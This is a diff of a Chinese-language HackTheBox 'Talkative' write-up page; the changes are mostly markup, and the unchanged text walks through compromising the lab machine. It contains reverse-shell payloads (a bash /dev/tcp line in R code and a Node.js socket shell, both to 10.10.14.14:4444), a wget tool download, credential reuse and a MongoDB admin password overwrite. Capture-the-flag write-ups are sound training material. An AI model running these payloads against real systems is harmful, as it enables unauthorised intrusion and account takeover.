@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;458 10.10.11.155                                                                                                              端口扫描22,80,3000,8080,">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;458 10.10.11.155   端口扫描22,80,3000,8080,8081,8082,注意22被防火墙过滤了，外部用不了: 123456789101112131415161718192021222324252627282930313233343536373839404142434">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Talkative - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2022/04/21/Talkative-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;458 10.10.11.155                                                                                                              端口扫描22,80,3000,8080,">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;458 10.10.11.155   端口扫描22,80,3000,8080,8081,8082,注意22被防火墙过滤了，外部用不了: 123456789101112131415161718192021222324252627282930313233343536373839404142434">
 <meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022042101.jpg">
 <meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022042102.jpg">
 <meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022042107.jpg">
@@ -127,8 +127,15 @@
             </li>
         
             <li class="waves-block waves-effect">
+              <a href="https://www.buymeacoffee.com/darkwing_nya" target="_blank" >
+                <i class="icon icon-lg icon-coffee"></i>
+                Buy me a coffe
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link"></i>
+                <i class="icon icon-lg icon-link2"></i>
                 About
               </a>
             </li>
@@ -150,7 +157,7 @@
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                 <i class="icon icon-lg icon-chevron-left"></i>
             </a>
-            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                 <i class="icon icon-lg icon-search"></i>
             </a>
@@ -217,77 +224,26 @@
 <li><a href="https://www.hackthebox.com/home/machines/profile/458" target="_blank" rel="noopener">https://www.hackthebox.com/home/machines/profile/458</a></li>
 <li>10.10.11.155</li>
 </ul>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022042101.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022042101.jpg" alt=""></p>
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>22,80,3000,8080,8081,8082,注意22被防火墙过滤了，外部用不了:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV 10.10.11.155</span></span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-21 13:35 CST</span><br><span class="line">Nmap scan report for 10.10.11.155</span><br><span class="line">Host is up (0.22s latency).</span><br><span class="line">Not shown: 994 closed tcp ports (conn-refused)</span><br><span class="line">PORT     STATE    SERVICE VERSION</span><br><span class="line">22/tcp   filtered ssh</span><br><span class="line">80/tcp   open     http    Apache httpd 2.4.52</span><br><span class="line">|_http-server-header: Apache/2.4.52 (Debian)</span><br><span class="line">|_http-title: Did not follow redirect to http://talkative.htb</span><br><span class="line">3000/tcp open     ppp?</span><br><span class="line">| fingerprint-strings:</span><br><span class="line">|   GetRequest:</span><br><span class="line">|     HTTP/1.1 200 OK</span><br><span class="line">|     X-XSS-Protection: 1</span><br><span class="line">|     X-Instance-ID: W8u2yS8skXBJ9hTgb</span><br><span class="line">|     Content-Type: text/html; charset=utf-8</span><br><span class="line">|     Vary: Accept-Encoding</span><br><span class="line">|     Date: Thu, 21 Apr 2022 05:36:17 GMT</span><br><span class="line">|     Connection: close</span><br><span class="line">|     &lt;!DOCTYPE html&gt;</span><br><span class="line">|     &lt;html&gt;</span><br><span class="line">|     &lt;head&gt;</span><br><span class="line">|     &lt;link rel="stylesheet" type="text/css" class="__meteor-css__" href="/3ab95015403368c507c78b4228d38a494ef33a08.css?meteor_css_resource=true"&gt;</span><br><span class="line">|     &lt;meta charset="utf-8" /&gt;</span><br><span class="line">|     &lt;meta http-equiv="content-type" content="text/html; charset=utf-8" /&gt;</span><br><span class="line">|     &lt;meta http-equiv="expires" content="-1" /&gt;</span><br><span class="line">|     &lt;meta http-equiv="X-UA-Compatible" content="IE=edge" /&gt;</span><br><span class="line">|     &lt;meta name="fragment" content="!" /&gt;</span><br><span class="line">|     &lt;meta name="distribution" content="global" /&gt;</span><br><span class="line">|     &lt;meta name="rating" content="general" /&gt;</span><br><span class="line">|     &lt;meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" /&gt;</span><br><span class="line">|     &lt;meta name="mobile-web-app-capable" content="yes" /&gt;</span><br><span class="line">|     &lt;meta name="apple-mobile-web-app-capable" conten</span><br><span class="line">|   HTTPOptions:</span><br><span class="line">|     HTTP/1.1 200 OK</span><br><span class="line">|     X-XSS-Protection: 1</span><br><span class="line">|     X-Instance-ID: W8u2yS8skXBJ9hTgb</span><br><span class="line">|     Content-Type: text/html; charset=utf-8</span><br><span class="line">|     Vary: Accept-Encoding</span><br><span class="line">|     Date: Thu, 21 Apr 2022 05:36:19 GMT</span><br><span class="line">|     Connection: close</span><br><span class="line">|     &lt;!DOCTYPE html&gt;</span><br><span class="line">|     &lt;html&gt;</span><br><span class="line">|     &lt;head&gt;</span><br><span class="line">|     &lt;link rel="stylesheet" type="text/css" class="__meteor-css__" href="/3ab95015403368c507c78b4228d38a494ef33a08.css?meteor_css_resource=true"&gt;</span><br><span class="line">|     &lt;meta charset="utf-8" /&gt;</span><br><span class="line">|     &lt;meta http-equiv="content-type" content="text/html; charset=utf-8" /&gt;</span><br><span class="line">|     &lt;meta http-equiv="expires" content="-1" /&gt;</span><br><span class="line">|     &lt;meta http-equiv="X-UA-Compatible" content="IE=edge" /&gt;</span><br><span class="line">|     &lt;meta name="fragment" content="!" /&gt;</span><br><span class="line">|     &lt;meta name="distribution" content="global" /&gt;</span><br><span class="line">|     &lt;meta name="rating" content="general" /&gt;</span><br><span class="line">|     &lt;meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" /&gt;</span><br><span class="line">|     &lt;meta name="mobile-web-app-capable" content="yes" /&gt;</span><br><span class="line">|     &lt;meta name="apple-mobile-web-app-capable" conten</span><br><span class="line">|   Help, NCP:</span><br><span class="line">|_    HTTP/1.1 400 Bad Request</span><br><span class="line">8080/tcp open     http    Tornado httpd 5.0</span><br><span class="line">|_http-server-header: TornadoServer/5.0</span><br><span class="line">|_http-title: jamovi</span><br><span class="line">8081/tcp open     http    Tornado httpd 5.0</span><br><span class="line">|_http-server-header: TornadoServer/5.0</span><br><span class="line">|_http-title: 404: Not Found</span><br><span class="line">8082/tcp open     http    Tornado httpd 5.0</span><br><span class="line">|_http-server-header: TornadoServer/5.0</span><br><span class="line">|_http-title: 404: Not Found</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port3000-TCP:V=7.92%I=7%D=4/21%Time=6260ED52%P=x86_64-apple-darwin20.4.</span><br><span class="line">SF:0%r(GetRequest,31BA,"HTTP/1\.1\x20200\x20OK\r\nX-XSS-Protection:\x201\r</span><br><span class="line">SF:\nX-Instance-ID:\x20W8u2yS8skXBJ9hTgb\r\nContent-Type:\x20text/html;\x2</span><br><span class="line">SF:0charset=utf-8\r\nVary:\x20Accept-Encoding\r\nDate:\x20Thu,\x2021\x20Ap</span><br><span class="line">SF:r\x202022\x2005:36:17\x20GMT\r\nConnection:\x20close\r\n\r\n&lt;!DOCTYPE\x</span><br><span class="line">SF:20html&gt;\n&lt;html&gt;\n&lt;head&gt;\n\x20\x20&lt;link\x20rel=\"stylesheet\"\x20type=\"</span><br><span class="line">SF:text/css\"\x20class=\"__meteor-css__\"\x20href=\"/3ab95015403368c507c78</span><br><span class="line">SF:b4228d38a494ef33a08\.css\?meteor_css_resource=true\"&gt;\n&lt;meta\x20charset</span><br><span class="line">SF:=\"utf-8\"\x20/&gt;\n\t&lt;meta\x20http-equiv=\"content-type\"\x20content=\"t</span><br><span class="line">SF:ext/html;\x20charset=utf-8\"\x20/&gt;\n\t&lt;meta\x20http-equiv=\"expires\"\x</span><br><span class="line">SF:20content=\"-1\"\x20/&gt;\n\t&lt;meta\x20http-equiv=\"X-UA-Compatible\"\x20co</span><br><span class="line">SF:ntent=\"IE=edge\"\x20/&gt;\n\t&lt;meta\x20name=\"fragment\"\x20content=\"!\"\</span><br><span class="line">SF:x20/&gt;\n\t&lt;meta\x20name=\"distribution\"\x20content=\"global\"\x20/&gt;\n\t</span><br><span class="line">SF:&lt;meta\x20name=\"rating\"\x20content=\"general\"\x20/&gt;\n\t&lt;meta\x20name=</span><br><span class="line">SF:\"viewport\"\x20content=\"width=device-width,\x20initial-scale=1,\x20ma</span><br><span class="line">SF:ximum-scale=1,\x20user-scalable=no\"\x20/&gt;\n\t&lt;meta\x20name=\"mobile-we</span><br><span class="line">SF:b-app-capable\"\x20content=\"yes\"\x20/&gt;\n\t&lt;meta\x20name=\"apple-mobil</span><br><span class="line">SF:e-web-app-capable\"\x20conten")%r(Help,1C,"HTTP/1\.1\x20400\x20Bad\x20R</span><br><span class="line">SF:equest\r\n\r\n")%r(NCP,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")</span><br><span class="line">SF:%r(HTTPOptions,31BA,"HTTP/1\.1\x20200\x20OK\r\nX-XSS-Protection:\x201\r</span><br><span class="line">SF:\nX-Instance-ID:\x20W8u2yS8skXBJ9hTgb\r\nContent-Type:\x20text/html;\x2</span><br><span class="line">SF:0charset=utf-8\r\nVary:\x20Accept-Encoding\r\nDate:\x20Thu,\x2021\x20Ap</span><br><span class="line">SF:r\x202022\x2005:36:19\x20GMT\r\nConnection:\x20close\r\n\r\n&lt;!DOCTYPE\x</span><br><span class="line">SF:20html&gt;\n&lt;html&gt;\n&lt;head&gt;\n\x20\x20&lt;link\x20rel=\"stylesheet\"\x20type=\"</span><br><span class="line">SF:text/css\"\x20class=\"__meteor-css__\"\x20href=\"/3ab95015403368c507c78</span><br><span class="line">SF:b4228d38a494ef33a08\.css\?meteor_css_resource=true\"&gt;\n&lt;meta\x20charset</span><br><span class="line">SF:=\"utf-8\"\x20/&gt;\n\t&lt;meta\x20http-equiv=\"content-type\"\x20content=\"t</span><br><span class="line">SF:ext/html;\x20charset=utf-8\"\x20/&gt;\n\t&lt;meta\x20http-equiv=\"expires\"\x</span><br><span class="line">SF:20content=\"-1\"\x20/&gt;\n\t&lt;meta\x20http-equiv=\"X-UA-Compatible\"\x20co</span><br><span class="line">SF:ntent=\"IE=edge\"\x20/&gt;\n\t&lt;meta\x20name=\"fragment\"\x20content=\"!\"\</span><br><span class="line">SF:x20/&gt;\n\t&lt;meta\x20name=\"distribution\"\x20content=\"global\"\x20/&gt;\n\t</span><br><span class="line">SF:&lt;meta\x20name=\"rating\"\x20content=\"general\"\x20/&gt;\n\t&lt;meta\x20name=</span><br><span class="line">SF:\"viewport\"\x20content=\"width=device-width,\x20initial-scale=1,\x20ma</span><br><span class="line">SF:ximum-scale=1,\x20user-scalable=no\"\x20/&gt;\n\t&lt;meta\x20name=\"mobile-we</span><br><span class="line">SF:b-app-capable\"\x20content=\"yes\"\x20/&gt;\n\t&lt;meta\x20name=\"apple-mobil</span><br><span class="line">SF:e-web-app-capable\"\x20conten");</span><br><span class="line">Service Info: Host: 172.17.0.18</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 85.53 seconds</span><br></pre></td></tr></table></figure>
 
 <h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>需要加hosts</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.155 talkative.htb</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022042102.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022042102.jpg" alt=""></p>
 <p>Bolt cms:</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022042107.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022042107.jpg" alt=""></p>
 <h2 id="3000"><a href="#3000" class="headerlink" title="3000"></a>3000</h2><p>rocket chat:</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022042103.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022042103.jpg" alt=""></p>
 <h2 id="8080"><a href="#8080" class="headerlink" title="8080"></a>8080</h2><p>jamovi 0.9.5.5:</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022042104.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022042104.jpg" alt=""></p>
 <h2 id="8081-8082"><a href="#8081-8082" class="headerlink" title="8081/8082"></a>8081/8082</h2><p>直接访问是404: Not Found</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022042105.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022042105.jpg" alt=""></p>
 <h1 id="jamovi"><a href="#jamovi" class="headerlink" title="jamovi"></a>jamovi</h1><p>8080的jamovi,可以直接运行R语言代码，是在一个容器中：</p>
 <figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">system(<span class="string">"bash -c 'id &amp;&amp; hostname'"</span>, intern = <span class="literal">TRUE</span>) </span><br><span class="line">system(<span class="string">"bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.14/4444 0&gt;&amp;1'"</span>,intern=<span class="literal">TRUE</span>)</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022042106.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022042106.jpg" alt=""></p>
 <h2 id="bolt-administration-omv"><a href="#bolt-administration-omv" class="headerlink" title="bolt-administration.omv"></a>bolt-administration.omv</h2><p>/root目录有个bolt-administration.omv文件，下载下来分析,容器不方便下载操作，可以直接base64,omv就是zip文件，直接解压,解压出来的文件中，xdata.json里得到几组账号密码：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">base64 bolt-administration.omv</span><br><span class="line"></span><br><span class="line">echo xxxx | base64 -d &gt; bolt-administration.omv</span><br><span class="line">unzip bolt-administration.omv</span><br></pre></td></tr></table></figure>
 
@@ -296,56 +252,21 @@
 <h1 id="Bolt-cms"><a href="#Bolt-cms" class="headerlink" title="Bolt cms"></a>Bolt cms</h1><p>根据已知信息，80是bolt cms，得到的密码信息是bolt-administration，所以回到80,bolt cms默认登陆路径尝试复用密码,成功登录，Bolt version 5.1.3：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;talkative.htb&#x2F;bolt&#x2F;login</span><br><span class="line"></span><br><span class="line">admin : jeO09ufhWD&lt;s</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022042108.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022042108.jpg" alt=""></p>
 <p>后台直接修改php文件，得到另一个容器www-data shell：</p>
 <p>setting -&gt; configxxxx -&gt; all configxxx files,进去修改php文件,然后访问任意页面触发：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;talkative.htb&#x2F;bolt&#x2F;file-edit&#x2F;config?file&#x3D;&#x2F;bundles.php</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022042109.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022042110.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022042109.jpg" alt=""></p>
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022042110.jpg" alt=""></p>
 <p>升级tty，没有python，可以这样升：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script -qc &#x2F;bin&#x2F;bash &#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>
 
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>容器内可以ssh连接到宿主机，复用前面得到的那些账号密码：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">script -qc /bin/bash /dev/null</span><br><span class="line"></span><br><span class="line">ssh saul@10.10.11.155</span><br><span class="line">jeO09ufhWD&lt;s</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022042111.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022042112.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022042111.jpg" alt=""></p>
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022042112.jpg" alt=""></p>
 <h1 id="mongo"><a href="#mongo" class="headerlink" title="mongo"></a>mongo</h1><p>运行pspy可以发现mongo相关，检查发现mongo是另一个容器：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">2022/04/09 21:31:01 CMD: UID=0    PID=79640  | /bin/sh -c cp /root/.backup/passwd /etc/passwd </span><br><span class="line">2022/04/09 21:31:01 CMD: UID=0    PID=84170  | cp /root/.backup/shadow /etc/shadow </span><br><span class="line">2022/04/09 21:51:01 CMD: UID=0    PID=84169  | python3 /root/.backup/update_mongo.py </span><br><span class="line">2022/04/09 21:51:01 CMD: UID=0    PID=84172  | python3 /root/.backup/update_mongo.py</span><br><span class="line"></span><br><span class="line">saul@talkative:~/.ssh$ netstat -ano | grep 27017</span><br><span class="line">netstat -ano | grep 27017</span><br><span class="line">tcp        0      0 172.17.0.1:42930        172.17.0.2:27017        TIME_WAIT   timewait (44.67/0/0)</span><br><span class="line">tcp        0      0 172.17.0.1:42928        172.17.0.2:27017        TIME_WAIT   timewait (44.67/0/0)</span><br></pre></td></tr></table></figure>
 
@@ -353,14 +274,7 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> remote</span></span><br><span class="line">wget 10.10.14.14:7777/chisel_1.7.6_linux_amd64</span><br><span class="line">./chisel_1.7.6_linux_amd64 client 10.10.14.14:6969 R:27017:172.17.0.2:27017</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">local</span></span></span><br><span class="line"> ./chisel_1.7.0-rc7_darwin_amd64 server -p 6969 --reverse</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash"> mongo</span></span><br><span class="line">brew install mongosh</span><br><span class="line">mongosh "mongodb://LOCALHOST:27017"</span><br><span class="line"></span><br><span class="line">show databases</span><br><span class="line">use admin</span><br><span class="line">show tables</span><br><span class="line">db.system.keys.find()</span><br><span class="line">use meteor</span><br><span class="line">show tables</span><br><span class="line">db.users.find()</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 明文 12345</span></span><br><span class="line">db.getCollection('users').update(&#123;username:"admin"&#125;, &#123; $set: &#123;"services" : &#123; "password" : &#123;"bcrypt" : "$2a$10$n9CM8OgInDlwpvjLKLPML.eizXIzLlRtgCh3GRLafOdR9ldAUh/KG" &#125; &#125; &#125; &#125;)</span><br></pre></td></tr></table></figure>
 
 <h1 id="Rocket-Chat"><a href="#Rocket-Chat" class="headerlink" title="Rocket.Chat"></a>Rocket.Chat</h1><p>使用修改后的密码登录3000端口的Rocket.Chat，版本2.4.14：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022042113.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022042113.jpg" alt=""></p>
 <p>搜到相关漏洞：</p>
 <ul>
 <li>CsEnox/CVE-2021-22911: Pre-Auth Blind NoSQL Injection leading to Remote Code Execution in Rocket Chat 3.12.1<br><a href="https://github.com/CsEnox/CVE-2021-22911" target="_blank" rel="noopener">https://github.com/CsEnox/CVE-2021-22911</a></li>
@@ -368,30 +282,9 @@
 <h2 id="CVE-2021-22911"><a href="#CVE-2021-22911" class="headerlink" title="CVE-2021-22911"></a>CVE-2021-22911</h2><p>集成(integrations) webhook运行自定义nodejs代码,添加之后得到调用的curl命令，运行触发,得到该容器root：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST -H 'Content-Type: application/json' --data '&#123;"username":"miao","text":"Example message","attachments":[&#123;"title":"Rocket.Chat","title_link":"https://rocket.chat","text":"Rocket.Chat, the best open source chat","image_url":"/images/integration-attachment-example.png","color":"#764FA5"&#125;]&#125;' http://10.10.11.155:3000/hooks/YemLLtCAsASjTYtF6/8zLfJzKrSodq2o7owhfdbFjwknGXmXE3mJbH9eeMzsxmuBmL</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022042114.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022042116.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022042117.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022042114.jpg" alt=""></p>
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022042116.jpg" alt=""></p>
+<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022042117.jpg" alt=""></p>
 <h2 id="reverse-js"><a href="#reverse-js" class="headerlink" title="reverse.js"></a>reverse.js</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="built_in">require</span> = <span class="built_in">console</span>.log.constructor(<span class="string">'return process.mainModule.require'</span>)();</span><br><span class="line"><span class="keyword">var</span> net = <span class="built_in">require</span>(<span class="string">"net"</span>), cp = <span class="built_in">require</span>(<span class="string">"child_process"</span>), sh = cp.spawn(<span class="string">"/bin/sh"</span>, []);</span><br><span class="line"><span class="keyword">var</span> client = <span class="keyword">new</span> net.Socket();</span><br><span class="line">client.connect(<span class="number">4444</span>, <span class="string">"10.10.14.14"</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  client.pipe(sh.stdin);</span><br><span class="line">  sh.stdout.pipe(client);</span><br><span class="line">  sh.stderr.pipe(client);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
 
 <h1 id="docker逃逸-amp-root-flag"><a href="#docker逃逸-amp-root-flag" class="headerlink" title="docker逃逸 &amp; root flag"></a>docker逃逸 &amp; root flag</h1><ul>
@@ -400,14 +293,7 @@
